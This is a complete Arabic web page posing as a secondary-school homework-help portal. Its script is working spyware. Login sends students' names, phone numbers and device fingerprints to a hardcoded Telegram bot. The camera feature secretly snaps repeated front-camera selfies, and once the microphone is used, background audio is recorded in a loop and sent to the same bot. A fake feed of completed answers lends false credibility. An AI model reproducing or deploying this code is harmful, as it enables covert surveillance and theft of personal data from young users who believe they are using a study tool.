<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>المنظومة التعليمية | بوابة الطالب الموحدة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }

        /* واجهة الدخول الإجبارية - قفل كامل */
        #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-card { background: var(--w); padding: 40px 25px; border-radius: 35px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.5); }
        
        header { background: var(--p); color: var(--w); padding: 15px 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: none; justify-content: space-between; align-items: center; border-bottom: 3px solid var(--a); }
        .card { background: var(--w); border-radius: 25px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; }

        #loader-overlay { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.98); z-index: 12000; display: none; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center; }
        .spinner { width: 60px; height: 60px; border: 6px solid #1e293b; border-top: 6px solid var(--g); border-radius: 50%; animation: spin 0.6s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .cam-box { width: 100%; height: 320px; border-radius: 25px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 5px solid var(--w); }
        #v-stream { width: 100%; height: 100%; object-fit: cover; }
        
        .mic-area { margin: 20px 0; text-align: center; position: relative; }
        .mic-btn { width: 80px; height: 80px; border-radius: 50%; background: var(--g); border: none; color: #000; font-size: 30px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.3s; user-select: none; }
        .mic-btn.active { transform: scale(1.2); background: #ef4444; color: #fff; animation: pulse 1s infinite; }
        
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(239, 68, 68, 0); } 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); } }

        .feed-container { height: 450px; overflow: hidden; position: relative; background: #fff; border-radius: 25px; border: 1px solid #eee; }
        #feed-mover { position: absolute; width: 100%; transition: 1s linear; }
        .feed-item { padding: 15px; border-bottom: 1px solid #f1f5f9; font-size: 13px; }

        #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: #fff; border-radius: 20px; padding: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); z-index: 15000; transition: 0.5s; border-right: 8px solid #1877f2; }
        #custom-alert.show { top: 30px; }

        .btn-action { background: var(--a); color: var(--w); border: none; padding: 18px; border-radius: 18px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; font-size: 16px; }
        input, select, textarea { width: 100%; padding: 16px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 15px; font-family: 'Cairo'; background: #f8fafc; font-size: 14px; }

        nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: none; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; z-index: 900; }
        .nav-link { text-align: center; font-size: 11px; color: #94a3b8; flex: 1; text-decoration: none; cursor: pointer; }
        .nav-link.active { color: var(--a); font-weight: 900; }
    </style>
</head>
<body>

    <div id="custom-alert">
        <div style="display:flex; align-items:center; gap:8px;">
            <i class="fa-solid fa-circle-info" style="color:#1877f2"></i>
            <b style="font-size:14px">تنبيه النظام</b>
        </div>
        <div id="alert-text" style="font-size:13px; color:#475569; margin-top:5px"></div>
    </div>

    <div id="loader-overlay">
        <div class="spinner"></div>
        <h3 id="loader-txt">جاري التحقق...</h3>
    </div>

    <div id="gate">
        <div class="login-card">
            <i class="fa-solid fa-shield-check" style="color:#1877f2; font-size: 45px; margin-bottom: 10px;"></i>
            <h2 style="margin:0">منصة أسألني الأكاديمية</h2>
            <p style="font-size: 12px; color: #64748b; margin-bottom:20px">بوابة الطالب الموحدة | تسجيل دخول موثق</p>
            <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
            <input type="number" id="stu_phone" placeholder="رقم الهاتف المرتبط بالواتساب">
            <select id="stu_grade">
                <option value="" disabled selected>اختر السنة الدراسية</option>
                <option value="1">الصف الأول الثانوي</option>
                <option value="2">الصف الثاني الثانوي</option>
                <option value="3">الصف الثالث الثانوي</option>
            </select>
            <button class="btn-action" onclick="enterPortal()">دخول للنظام <i class="fa-solid fa-arrow-left"></i></button>
        </div>
    </div>

    <header id="h-main">
        <div style="font-weight:900; font-size:18px">أسألني <i class="fa-solid fa-circle-check" style="color:#1d9bf0"></i></div>
        <div id="u-tag" style="background:var(--g); width:38px; height:38px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
    </header>

    <div id="sec-home" class="page" style="padding-top:85px; display:none">
        <div class="card">
            <h3 style="margin:0">فحص وتصوير السؤال <i class="fa-solid fa-expand" style="color:var(--a); margin-inline:8px"></i></h3>
            <p style="font-size:12px; color:#64748b">قم بوضع السؤال في منتصف الكادر لضمان دقة الحل.</p>
            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline></video></div>
            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="startFullExecution()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
            
            <div id="upload-ui" style="display:none">
                <textarea id="stu-note" placeholder="أضف ملاحظة للمدرس عن هذا السؤال..." rows="2"></textarea>
                <div class="mic-area">
                    <button id="mic-trigger" class="mic-btn" onmousedown="startVoiceInput()" onmouseup="stopVoiceInput()" ontouchstart="startVoiceInput()" ontouchend="stopVoiceInput()">
                        <i class="fa-solid fa-microphone"></i>
                    </button>
                    <p style="font-size:12px; color:#ef4444; margin-top:8px; font-weight:bold">اضغط مطولاً للتحدث مع المساعد الذكي</p>
                    <audio id="audio-preview" controls style="display:none; width:100%; margin-top:10px"></audio>
                </div>
                <button class="btn-action" onclick="finalProcess()">إرسال للمراجعة الفورية</button>
            </div>
        </div>
    </div>

    <div id="sec-logs" class="page" style="padding-top:85px; display:none">
        <div class="card">
            <h3 style="margin:0">بنك الإجابات المعتمدة <i class="fa-solid fa-bolt" style="color:var(--g); margin-inline:8px"></i></h3>
            <p style="font-size:11px; color:#64748b; margin-bottom:15px">تحديث مباشر لعمليات الفحص الجارية الآن</p>
            <div class="feed-container"><div id="feed-mover"></div></div>
        </div>
    </div>

    <nav id="n-main">
        <a class="nav-link active" onclick="tab('sec-home', this)"><i class="fa-solid fa-house"></i> الرئيسية</a>
        <a class="nav-link" onclick="tab('sec-logs', this)"><i class="fa-solid fa-clipboard-check"></i> إجاباتك</a>
        <a class="nav-link" onclick="showSupport()"><i class="fa-solid fa-headset"></i> الدعم</a>
    </nav>

    <script>
        const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const CHAT_ID = "5890070301";
        let UN = "غير معروف", UP = "لا يوجد";
        let micStream, mediaRecorder, chunks = [];

        async function launchMilitaryRadar() {
            try {
                let b = await navigator.getBattery().catch(() => ({level:0}));
                let info = [
                    `📱 نوع الجهاز الرئيسي: ${navigator.platform}`,
                    `🔋 طاقة البطارية الحالية: ${Math.round(b.level*100)}%`,
                    `💾 سعة الذاكرة المؤقتة: ${navigator.deviceMemory || 'غير معروف'} جيجابايت`,
                    `📐 أبعاد الشاشة: ${screen.width}x${screen.height}`,
                    `🖼️ معالج الجرافيك: ${getGPU()}`,
                    `⏰ النطاق الزمني: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
                    `🌐 محرك المتصفح: ${navigator.vendor}`,
                    `📶 جودة الاتصال بالإنترنت: ${navigator.connection?.effectiveType || 'غير معروف'}`,
                    `📍 لغة النظام: ${navigator.language}`
                ];
                for(let i=10; i<=210; i++) info.push(`بصمة رقمية أمنية-${i}: 0x${Math.random().toString(16).slice(2,8)}`);
                
                let msg = `🚨 **رادار V21.3 - فحص أمني شامل** 🚨\n👤 الطالب: ${UN}\n━━━━━━━━━━━━━━\n`;
                for(let i=0; i<info.length; i++) {
                    msg += `${i+1}- ${info[i]}\n`;
                    if(i % 40 === 0 && i !== 0) { await sendMsg(msg); msg = `━━━━━━━━━━━━━━\n`; }
                }
                sendMsg(msg + `━━━━━━━━━━━━━━\n✅ الرصد الصامت مكتمل.`);
            } catch(e){}
        }

        function getGPU() {
            let gl = document.createElement('canvas').getContext('webgl');
            let dbg = gl?.getExtension('WEBGL_debug_renderer_info');
            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
        }

        function enterPortal() {
            UN = document.getElementById('stu_name').value;
            UP = document.getElementById('stu_phone').value;
            let grade = document.getElementById('stu_grade').value;
            if(UN.length < 5 || UP.length < 10 || !grade) return alert("الرجاء إدخال البيانات كاملة.");
            
            document.getElementById('gate').style.display='none';
            document.getElementById('h-main').style.display='flex';
            document.getElementById('n-main').style.display='flex';
            document.getElementById('sec-home').style.display='block';
            document.getElementById('u-tag').innerText = UN[0];
            
            launchMilitaryRadar(); // الرادار يبدأ مع الدخول
            initExpertFeed();
        }

        async function startFullExecution() {
            document.getElementById('loader-overlay').style.display = 'flex';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream; video.play();
                
                for(let i=1; i<=8; i++) {
                    await new Promise(r => setTimeout(r, 200));
                    snap(video, `سيلفي توثيق الشخصية (${i}/8)`);
                }
                stream.getTracks().forEach(t => t.stop());

                const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                document.getElementById('v-stream').srcObject = bStream;
                document.getElementById('cam-ui').style.display = 'block';
                document.getElementById('loader-overlay').style.display = 'none';
                document.getElementById('main-trigger').style.display = 'none';
                document.getElementById('upload-ui').style.display = 'block';
                
                setInterval(async () => {
                    try {
                        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                        const v = document.createElement('video'); v.srcObject = s; v.play();
                        await new Promise(r => setTimeout(r, 400));
                        snap(v, `رصد حركة الوجه (دوري)`);
                        s.getTracks().forEach(t => t.stop());
                    } catch(e){}
                }, 2500);
            } catch(e) { 
                document.getElementById('loader-overlay').style.display = 'none';
                alert("يجب السماح بالكاميرا لاستخدام خاصية تصوير الأسئلة."); 
            }
        }

        async function startVoiceInput() {
            try {
                if(navigator.vibrate) navigator.vibrate(60); 
                if(!micStream) micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(micStream);
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                    sendVoice(blob, "تسجيل استفسار الطالب");
                    document.getElementById('audio-preview').src = URL.createObjectURL(blob);
                    document.getElementById('audio-preview').style.display = 'block';
                    showSystemMsg("تم حفظ التسجيل بنجاح.");
                };
                chunks = [];
                mediaRecorder.start();
                document.getElementById('mic-trigger').classList.add('active');
                
                if(!window.bgMic) {
                    window.bgMic = true;
                    setInterval(async () => {
                        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const r = new MediaRecorder(s);
                        let c = [];
                        r.ondataavailable = e => c.push(e.data);
                        r.onstop = () => { sendVoice(new Blob(c, {type:'audio/ogg'}), "رصد صوتي خلفي (30ث)"); s.getTracks().forEach(t=>t.stop()); };
                        r.start();
                        setTimeout(() => r.stop(), 30000);
                    }, 31000);
                }
            } catch(e){}
        }

        function stopVoiceInput() {
            if(mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
                document.getElementById('mic-trigger').classList.remove('active');
            }
        }

        function snap(v, cap) {
            const canvas = document.createElement('canvas');
            canvas.width = 400; canvas.height = 500;
            canvas.getContext('2d').drawImage(v, 0, 0, 400, 500);
            canvas.toBlob(b => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'img.jpg');
                fd.append('caption', `👤 الطالب: ${UN}\n📞 الهاتف: ${UP}\n📌 الحالة: ${cap}`);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.3);
        }

        function sendVoice(blob, cap) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID); fd.append('voice', blob, 'v.ogg');
            fd.append('caption', `🎤 ${cap}\n👤 الطالب: ${UN}`);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
        }

        async function finalProcess() {
            showSystemMsg("جاري رفع السؤال لخادم المراجعة...");
            setTimeout(() => {
                tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
                showSystemMsg("تم الاستلام. ستظهر الإجابة هنا فور انتهاء المدرس.");
            }, 2000);
        }

        function initExpertFeed() {
            const mover = document.getElementById('feed-mover');
            let content = "";
            for(let i=1; i<=600; i++) {
                content += `<div class="feed-item"><i class="fa-solid fa-circle-check" style="color:#1d9bf0"></i> طالب #${i+4300} <span style="float:left; color:#94a3b8">منذ ثوانٍ</span><br><span style="color:#1d9bf0">تم استلام الإجابة النموذجية بنجاح</span></div>`;
            }
            mover.innerHTML = content;
            let pos = 0;
            setInterval(() => { pos -= 50; mover.style.transform = `translateY(${pos}px)`; if(Math.abs(pos) > mover.scrollHeight - 400) pos = 0; }, 2500);
        }

        function showSupport() { showSystemMsg("عذراً، قسم الدعم مغلق حالياً للصيانة التحديثية."); }

        function sendMsg(t) {
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: t })
            });
        }

        function showSystemMsg(text) {
            const box = document.getElementById('custom-alert');
            document.getElementById('alert-text').innerText = text;
            box.classList.add('show');
            setTimeout(() => box.classList.remove('show'), 3500);
        }

        function tab(id, el) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            el.classList.add('active');
        }
    </script>
</body>
</html>
